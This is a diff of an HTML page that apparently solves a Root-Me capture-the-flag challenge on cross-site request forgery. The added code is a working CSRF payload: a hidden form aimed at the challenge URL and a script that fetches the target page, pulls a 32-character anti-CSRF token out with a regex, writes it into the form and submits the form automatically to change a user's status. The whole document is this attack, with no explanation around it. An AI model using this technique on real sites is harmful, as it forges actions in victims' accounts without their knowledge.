@@ -1,21 +1,26 @@
 <html>
   <body>
-    <form id="profile" action="?action=profile" method="post" enctype="multipart/form-data">
-			<div>
-			  <label>Username:</label>
-			  <input id="username" type="text" name="username" value="test">
-			</div>
-			<br>		
-			<div>
-			  <label>Status:</label>
-			  <input id="status" type="checkbox" name="status" checked>
-			</div>
-			<br>
-			<input id="token" type="hidden" name="token" value="022e566752ccfd9f453f2b6363b876da">
-			<button type="submit">Submit</button>
-		</form>
+<form id="profile" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
+                        <div>
+                        <label>Username:</label>
+                        <input id="username" type="text" name="username" value="test">
+                        </div>
+                        <br>
+                        <div>
+                        <label>Status:</label>
+                        <input id="status" type="checkbox" name="status" checked>
+                        </div>
+                        <br>
+                        <input id="token" type="hidden" name="token" value="abcdef">
+</form>
     <script>
-      document.forms[0].submit()
+        var req = new XMLHttpRequest()
+        req.open("GET", "http://challenge01.root-me.org/web-client/ch23/")
+        req.send()
+        var resp = req.responseText
+        var token = resp.match(/[a-z0123456789]{32}/)[0]
+        document.getElementById("token").value = token
+        document.forms[0].submit()
     </script>
   </body>
 </html>
